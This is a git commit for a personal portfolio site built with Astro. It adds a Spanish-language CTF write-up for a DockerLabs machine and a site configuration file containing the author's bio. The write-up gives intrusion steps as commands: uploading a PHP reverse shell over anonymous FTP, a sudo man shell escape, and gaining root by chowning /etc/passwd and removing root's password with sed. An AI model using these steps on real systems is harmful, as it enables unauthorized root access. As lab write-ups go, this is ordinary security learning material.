279fbc62719cc4c8cd14ae0a17072414f047bd59
angelcorral2021 <angelvolta@hotmail.com>
2024-09-19 14:26:26 -0300

    first commit

---
+++ src/content/blog/post-15.md
@@ -0,0 +1,63 @@
+---
+title: Maquinas CTF Dockerlabs
+excerpt: WritheUp maquina de DockerLabs
+publishDate: 'Sept 19 2024'
+isFeatured: true
+tags:
+  - Web
+  - Guide
+  - CTF
+seo:
+  image:
+    src: '/post-14.jpg'
+    alt: Wavy lines
+---
+
+![Wavy lines](/post-14.jpg)
+
+
+
+> Web frameworks are the architectural blueprints that empower developers to build the digital landscapes of tomorrow.
+
+
+
+Entramos por ftp con usuario anonymous.
+Nos conectamos desde el directorio Downloads en nuestra maquina atacante al host victima por ftp y subimos una reverse shell con ftp 
+
+```
+put  php-reverse-shell2.php
+```
+
+Ya adentro revisamos los usuarios con:
+```
+cat /etc/passwd | grep sh$
+```
+
+Revisamos los permiso que tenemos:
+
+
+
+Con el comando sudo -u pingu man man abrimos un binario y ponemos !/bin/bash
+
+
+
+Ahora somo el usuario pingu, repetimos el proceso:
+
+
+
+Para escalar lo que tenemos que hacer es cambiar el propietario de /etc/passwd de la siguente manera:
+
+`sudo /usr/bin/chown $(id -un):$(id -gn) /etc/passwd`
+
+Luego con sed hacemos que elimine la X que tiene root para que la contraseña desaparezca y creamos un archivo temporal en tmp.
+
+`sed 's/^root:[^:]*:/root::/' /etc/passwd > /tmp/passwd.tmp`
+
+Para finalizar copiamos el tmp donde esta el original para que lo sobreescriba
+
+`cp /tmp/passwd.tmp /etc/passwd`
+
+![alt text](../../../public/obsy.png)
+
+Ahora hacemos un su ROOT y accederemos al usuario ROOT sin proporcionar contraseña
+
---
+++ src/data/site-config.ts
@@ -0,0 +1,90 @@
+export type Image = {
+    src: string;
+    alt?: string;
+    caption?: string;
+};
+
+export type Link = {
+    text: string;
+    href: string;
+};
+
+export type Hero = {
+    title?: string;
+    text?: string;
+    image?: Image;
+    actions?: Link[];
+};
+
+
+
+export type SiteConfig = {
+    logo?: Image;
+    title: string;
+    subtitle?: string;
+    description: string;
+    image?: Image;
+    headerNavLinks?: Link[];
+    footerNavLinks?: Link[];
+    socialLinks?: Link[];
+    hero?: Hero;
+    postsPerPage?: number;
+    projectsPerPage?: number;
+};
+
+const siteConfig: SiteConfig = {
+    title: 'Angel C. Corral',
+    subtitle: 'Portfolio y Ciberseguridad',
+    description: 'Blog y portafolio personal',
+    image: {
+        src: '/hero2.jpg',
+        alt: 'logo'
+    },
+    headerNavLinks: [
+        {
+            text: 'Home',
+            href: '/'
+        },
+        {
+            text: 'Projects',
+            href: '/projects'
+        },
+        {
+            text: 'Blog',
+            href: '/blog'
+        },
+        {
+            text: 'Tags',
+            href: '/tags'
+        }
+    ],
+    footerNavLinks: [
+        {
+            text: 'About',
+            href: '/about'
+        },
+        {
+            text: 'Contact',
+            href: '/contact'
+        }
+    ],
+    hero: {
+        title: 'Hola y Bienvenidos a mi Portafolio-Blog!',
+        text: "Hola, soy Angel Corral, estudiante de Ingeniería en Informática con un enfoque en desarrollo web, ciberseguridad y DevSecOps. Mi pasión es crear soluciones tecnológicas seguras y escalables, asegurando que la seguridad esté integrada desde las primeras etapas del ciclo de desarrollo de software. Tengo sólidos conocimientos en lenguajes como Python, JavaScript y Bash, además de experiencia en el desarrollo web utilizando tecnologías como HTML5, CSS3 (incluyendo Tailwind CSS) y Node.js. También manejo bases de datos como MySQL y MongoDB. Sin embargo, mi verdadera especialidad radica en la ciberseguridad y en la integración de prácticas DevSecOps, automatizando la seguridad a través de herramientas como Jenkins, Docker, y Kubernetes, y realizando pruebas de seguridad con OWASP ZAP y Burp Suite.En cuanto a proyectos, he desarrollado un sistema de control de gestión para PYMES, donde empleé arquitecturas en capas y buenas prácticas de seguridad. También he llevado a cabo pruebas de seguridad para aplicaciones web, contribuyendo a la identificación y mitigación de vulnerabilidades en entornos reales. Otro de mis proyectos incluye la automatización del control de inventario para un comedor comunitario, donde apliqué un enfoque de factibilidad técnica y operativa.Mis objetivos son seguir desarrollando mi carrera en ciberseguridad y DevSecOps, contribuyendo a proyectos que protejan aplicaciones e infraestructuras críticas. Estoy comprometido en seguir aprendiendo y perfeccionando mis habilidades para enfrentar los desafíos de seguridad en el mundo digital.",
+        image: {
+            src: '/hero.jpg',
+            alt: 'logo'
+        },
+        actions: [
+            {
+                text: 'Contacto',
+                href: '/contact'
+            }
+        ]
+    },
+   
+    postsPerPage: 8,
+    projectsPerPage: 8
+};
+
+export default siteConfig;
